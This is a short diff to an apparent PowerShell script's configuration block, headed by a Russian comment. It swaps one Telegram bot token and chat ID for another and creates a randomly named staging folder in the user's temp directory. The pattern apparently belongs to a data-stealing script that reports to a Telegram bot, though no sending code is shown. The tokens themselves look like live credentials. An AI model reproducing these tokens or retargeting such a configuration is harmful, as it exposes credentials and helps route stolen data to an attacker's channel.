@@ -1,6 +1,6 @@
 # [ Конфигурация ]
-$t = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
-$c = "806761221"
+$t = "6789606342:AAFofj2Q7T8yLHDhX-E7XVltO4mteEAxO_0"
+$c = "6519291696"
 $tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
 New-Item -ItemType Directory -Path $tmp -Force > $null
 
